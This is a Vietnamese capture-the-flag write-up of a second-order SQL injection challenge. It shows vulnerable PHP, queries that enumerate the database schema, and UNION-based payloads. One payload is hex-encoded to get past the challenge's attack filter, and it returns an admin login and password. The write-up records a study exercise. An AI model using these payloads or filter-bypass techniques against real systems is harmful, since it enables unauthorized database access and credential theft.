Những điều học được qua chall:

- Dạng thực thi sql mới: output của câu lệnh sql này là input của câu sql khác, ví dụ đoạn code như sau:

  ```php
  <?php  
      $id=$_GET['id'];
      $query="SELECT id,sec_code FROM users WHERE id='$id'";
  	if (!$result=mysql_query($query,$conn))  
          die("Error While Selection process :".mysql_error())
      $row = mysql_fetch_array($result, MYSQL_ASSOC);
      $query="SELECT username FROM users WHERE sec_code='".$row['sec_code']."'";
  ?>
  
  ```

- Để bypass filter của chall này, cần hex encode câu query thứ 2 và truyền vào query thứ nhất

- Một số câu truy vấn để exploit mysql database :

  ```mysql
  SELECT table_name FROM information_schema.tables;
  
  SELECT table_name FROM information_schema.tables
  WHERE table_schema = database();
  -- return  the name of all tables used
  
  SELECT COLUMN_NAME  
  FROM information_schema.columns  
  WHERE table_name='[table_name]'
  -- return name of column 
  ```

  

  Cách vượt qua challenge:

  - Đầu tiên thử inject kí tự đặc biệt ' vào input form, lưu ý cũng không nên thử ở form login( rút kinh nghiệm từ những bài trước), hiện ra thông báo lỗi nghĩa là có khả năng bị sql injection:

    > You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near ''''' at line 1

  - Thử input với query quen thuộc:

    ```mysql
    ' union select 1-- 
    ```

    (chú ý có dấu cách ở cuối câu, nếu không sẽ bị syntax error)

    ra kết quả:
    
    >[+] Requested login: ' union select 1-- -
>[+] Found ID: 1
    >[+] Email: jean@sqli_me.com

    Vậy ta đã biết string được truyền vào sau select chính là câu lệnh sql sẽ được thực hiện. Viết lại truy vấn như sau:
    
    ```mysql
' union select 'union select login,password from users-- -- 
    ```
    
     Tuy nhiên bị filter bypass, hiện thông báo attack detected, vậy ta hex encode query từ đoạn select trở đi rồi nhét trở lại query thứ nhất:
    
    ```mysql
    ' union select 0x2720756E696F6E2073656C656374206C6F67696E2C70617373776F72642066726F6D2075736572732D2D20-- 
    ```
    
    và ta có kết quả:
    
    >[+] Requested login: ' union select 0x2720756E696F6E2073656C656374206C6F67696E2C70617373776F72642066726F6D2075736572732D2D20-- 
    >[+] Found ID: admin
    >[+] Email: qs89QdAs9A

